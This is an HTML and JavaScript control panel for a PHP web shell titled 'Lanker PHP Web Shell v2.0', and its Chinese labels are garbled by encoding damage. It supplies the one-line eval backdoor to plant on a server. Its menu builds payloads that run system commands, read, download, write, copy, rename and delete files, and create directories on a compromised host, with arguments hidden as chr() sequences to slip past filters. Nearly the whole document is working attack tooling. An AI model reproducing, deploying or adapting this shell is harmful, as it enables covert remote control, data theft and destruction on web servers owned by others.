
<HTML><HEAD>
<title>Lanker PHP Web Shell v2.0</title>
<style>
<!--
 td		{font-size:8pt; color: #666666;font-family:Verdana}
 INPUT		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}
 textarea	{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
 select		{font-size:9pt;BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; COLOR: #666666; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #ffffff}  
 BODY		{font-size:9pt; color: #666666;font-family:Verdana; SCROLLBAR-FACE-COLOR: #ffffff; background color:#eeeeee;cursor:SCROLLBAR-HIGHLIGHT-COLOR: #ffffff; SCROLLBAR-SHADOW-COLOR: #aaaaaa; SCROLLBAR-3DLIGHT-COLOR: #aaaaaa; SCROLLBAR-ARROW-COLOR: #dddddd; SCROLLBAR-TRACK-COLOR: #ffffff; SCROLLBAR-DARKSHADOW-COLOR: #ffffff }
 a:link		{text-decoration:none; color:#336699} 
 a:visited	{text-decoration:none; color:#336699} 
 a:active	{text-decoration:none; color:#336699} 
 a:hover	{COLOR: #b4c8d8; }
 .tb		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#cccccc}
 .tb0		{BORDER-RIGHT: #cccccc 1px solid; BORDER-TOP: #cccccc 1px solid; BORDER-LEFT: #cccccc 1px solid; BORDER-BOTTOM: #cccccc 1px solid;background-color:#fcfcfc}
 .tb1		{background-color:#ffffff} </style>
-->
</STYLE>
</HEAD>
<BODY>
<CENTER>
<font color="#000080">
lanker΢��<FONT color=#ff3300>PHP</font>���ſͻ���2.0���԰�</font>


<FORM ENCTYPE="multipart/form-data" name=frm method=post target=qq2>

<hr size="1" color="#000000">
<TABLE style="FONT-SIZE: 9pt" width=750 >
  
    <TD height=10>ľ���ַ: <INPUT size=55 value=http://127.0.0.1/door.php name=act> ����: <INPUT size=10 value=cmd name=para>��������<INPUT                                                          

size=25 value="<?php eval($_POST[cmd]);?>" name="tmpcmd"></TD></TABLE>
<TABLE width=750 >
<TD bgcolor=#eeeeff><TABLE style="FONT-SIZE: 9pt" ><tr width=200 height=10>
<select onchange="showDiv(this.value);">
<option value="digest" >----���������б�----</option>
<option value="1" >PHP��������</option>
<option value="2" >������Ŀ¼</option>
<option value="3" >ִ��CMD������</option>
<option value="4" >�ϴ��ļ�</option>
<option value="5" >��ȡ�ļ�</option>
<option value="6" >��ȡĿ¼</option>
<option value="7" >�����ļ�</option>
<option value="8" >�������ļ�</option>
<option value="9" >ɾ���ļ�</option>
<option value="11" >�����ļ�</option>
<option value="12" >����Ŀ¼</option>
<option value="13" >�����ļ�</option>
<option value="14" >SQL���</option>
<option value="10" >ר��ģʽ���Լ�д���룩</option>
</select></tr><tr height=260><TD id="yunxing" ><FONT color=#ff3300> ����汾����ֻ���ô�Ұ�æ���Թ���ʵ���Ƿ������⣬�����Ż��ȴ�֮������ʽ�汾���Ѿ�ʵ�֣�</font><TD></tr></TABLE></td><td><TABLE style="FONT-SIZE: 9pt"><IFRAME border=1 height=340 width=580 name=qq2 marginwidth=0 marginheight=0 vspace=0
	  src="about:blank" 
      frameborder=no scrolling=auto></IFRAME></TABLE></td></table>
</form>
<hr size="1" color="#000000">
</CENTER>
<center><font class=font>PHP soft Web Shell v2.0<br>
-------------Code By <FONT color=#ff3300>lanker</font>��<FONT color=#ff3300>����</font> ----------- <br><br><FONT color=#ff3300>����:����ʹ�ñ�������·Ƿ���Ϊ���������Ը���</font></center>
</BODY></HTML>
<script language="javascript">
function showDiv(aa){

switch(aa) 
{ 

case "1":
yunxing.innerHTML="PHP��������<br>"
yunxing.innerHTML+="<p align='center'><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"phpinfo();\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>" 
break;
case "2":
yunxing.innerHTML="<p align='center'>������Ŀ¼<br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"echo dirname(__FILE__);\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "3": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;cmdmingling();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "4": 
yunxing.innerHTML="<p align='center'><input NAME='LanKerF' TYPE='file' size=12><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=\"echo copy($_FILES[LanKerF][tmp_name],$_FILES[LanKerF][name]);\";frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "5": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;duquwenjian();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "6": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;duqumulu();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "7": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  size=23 name=\"duqu2\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;fuzhiwenjian();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "8": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  size=23 name=\"duqu2\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;chongmingming();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "9": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;shanchu();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "10":
yunxing.innerHTML="<p align='center'><textarea  rows='17' name='duqu' cols='22'>phpinfo();</textarea>"
yunxing.innerHTML+="<br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;frm.tmpcmd.value=frm.duqu.value;frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send>"
break;
case "11": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;xiazai();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "12": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;chuangjianmulu();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
case "13": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><textarea  rows='16' name='duqu2' cols='23'>phpinfo();</textarea><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;chuangjianwenjian();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send>"
break;
case "14": 
yunxing.innerHTML="<p align='center'><INPUT  size=23 name=\"duqu\"><br><INPUT  size=23 name=\"duqu\"><br><INPUT  size=23 name=\"duqu\"><br><INPUT  onclick='Javascipt:frm.tmpcmd.name=frm.para.value;sqlyuju();frm.action=document.all.act.value;frm.submit();frm.tmpcmd.name=tmpcmd' type=button value='�� ��' name=Send><br><br><br><br><br><br><br><br><br><br>"
break;
} 
}

function duquwenjian(){
frm.tmpcmd.value="$filename="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$s=chr(60).chr(112).chr(114).chr(101).chr(62);\n"
frm.tmpcmd.value+="$e=chr(60).chr(47).chr(112).chr(114).chr(101).chr(62);\n"
frm.tmpcmd.value+="$fp=@fopen($filename,r);\n"
frm.tmpcmd.value+="$contents=@fread($fp, filesize($filename));\n"
frm.tmpcmd.value+="@fclose($fp);\n"
frm.tmpcmd.value+="$contents=htmlspecialchars($contents);\n"
frm.tmpcmd.value+="echo $s.$contents.$e;\n"
}
function duqumulu(){
frm.tmpcmd.value="$dir="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="$f = chr(60).chr(98).chr(114).chr(62);"
frm.tmpcmd.value+="$dir=@dir($dir);"
frm.tmpcmd.value+="if($dir) "
frm.tmpcmd.value+="{"
frm.tmpcmd.value+="  echo path_______.$dir->path.$f;"
frm.tmpcmd.value+="  while($entry=$dir->read())"
frm.tmpcmd.value+="	{"
frm.tmpcmd.value+=" echo ____.$entry.$f; "
frm.tmpcmd.value+="  }"
frm.tmpcmd.value+="  $dir->close();"
frm.tmpcmd.value+="}"
frm.tmpcmd.value+="else"
frm.tmpcmd.value+="{echo 0;}"
}
function fuzhiwenjian(){
frm.tmpcmd.value="$a="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="$b="
frm.tmpcmd.value+=duqu(frm.duqu2.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="echo @copy($a,$b); "
}
function chongmingming(){
frm.tmpcmd.value="$a="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="$b="
frm.tmpcmd.value+=duqu(frm.duqu2.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="echo @rename($a,$b);"
}
function shanchu(){
frm.tmpcmd.value="$a="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="echo @unlink($a);"
}
function cmdmingling(){
frm.tmpcmd.value="$c="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";\n"
frm.tmpcmd.value+="system($c);\n"

}
function xiazai(){
frm.tmpcmd.value="$df="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="$f=chr(46);"
frm.tmpcmd.value+="$h=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(116).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45);"
frm.tmpcmd.value+="$h1=chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61);"
frm.tmpcmd.value+="$h2=(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(80).chr(72).chr(80).chr(51).chr(32).chr(71).chr(101).chr(110).chr(101).chr(114).chr(97).chr(116).chr(101).chr(100).chr(32).chr(68).chr(97).chr(116).chr(97);"
frm.tmpcmd.value+="$fn = basename($df);"
frm.tmpcmd.value+="$finfo = explode($f, $fn);"
frm.tmpcmd.value+="$fe = $finfo[count($finfo)-1];"
frm.tmpcmd.value+="header($h.$fe);"
frm.tmpcmd.value+="header($h1.$fn);"
frm.tmpcmd.value+="header($h2);"
frm.tmpcmd.value+="@readfile($df);"
frm.tmpcmd.value+="exit;"
}
function chuangjianmulu(){
frm.tmpcmd.value="$mkdirs="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="echo mkdir($mkdirs,0777);"
}
function chuangjianwenjian(){
frm.tmpcmd.value+="$filename="
frm.tmpcmd.value+=duqu(frm.duqu.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="$c="
frm.tmpcmd.value+=duqu(frm.duqu2.value)
frm.tmpcmd.value+=";"
frm.tmpcmd.value+="$a=chr(119);"
frm.tmpcmd.value+="@$fp=fopen($filename,$a);"
frm.tmpcmd.value+="echo $msg=@fwrite($fp,$c);"
frm.tmpcmd.value+="@fclose($fp);"
}
function sqlyuju(){
alert("�˹����ݲ��ṩ!")
}
</script>
<script >
function duqu(asdf){ 
var duqu="";
for(i=1;i<asdf.length;i++){
duqu+="chr("+asdf.charCodeAt(i-1)+").";
}
duqu+="chr("+asdf.charCodeAt(asdf.length-1)+")";
return duqu
}
</script>